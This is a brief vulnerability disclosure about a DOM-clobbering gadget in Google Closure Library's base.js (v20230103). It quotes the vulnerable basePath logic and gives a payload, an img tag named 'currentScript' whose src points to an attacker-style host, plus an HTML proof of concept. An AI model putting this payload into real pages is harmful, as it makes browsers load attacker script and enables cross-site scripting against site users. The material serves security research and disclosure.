## Google Closure Library

### Meta

+ Library: Google Closure
+ Stars: 4.9K
+ Version: v20230103
+ Payload: ```<img name="currentScript" src="https://attack.hulk/base.js"></img>```
+ Impact: XSS
+ CVE: N/A
+ Status: Accepted
+ Foundby: TheHulk


### Library

https://cdnjs.cloudflare.com/ajax/libs/google-closure-library/20230103.0.0/base.js
https://cdnjs.cloudflare.com/ajax/libs/google-closure-library/20230103.0.0/base.min.js


### Vulnerable Code Snippet

```javascript
// If we have a currentScript available, use it exclusively.
var currentScript = doc.currentScript;
if (currentScript) {
  var scripts = [currentScript];
} else {
  var scripts = doc.getElementsByTagName('SCRIPT');
}
// Search backwards since the current script is in almost all cases the one
// that has base.js.
for (var i = scripts.length - 1; i >= 0; --i) {
  var script = /** @type {!HTMLScriptElement} */ (scripts[i]);
  var src = script.src;
  var qmark = src.lastIndexOf('?');
  var l = qmark == -1 ? src.length : qmark;
  if (src.slice(l - 7, l) == 'base.js') {
    goog.basePath = src.slice(0, l - 7);
    return;
  }
}
```
```javascript
goog.DebugLoader_.prototype.loadClosureDeps = function() {
// Circumvent addDependency, which would try to transpile deps.js if
// transpile is set to always.
var relPath = 'deps.js';
this.depsToLoad_.push(this.factory_.createDependency(
    goog.normalizePath_(goog.basePath + relPath), relPath, [], [], {}));
this.loadDeps_();
};
```

which eventually gets loaded...


## PoC

```html
<!--Library-->
<script src=https://cdnjs.cloudflare.com/ajax/libs/google-closure-library/20230103.0.0/base.js></script>
<!--Library-->

<!--Payload-->
<img name="currentScript" src="http://localhost:9999/base.js"></img>
<!--Payload-->
```
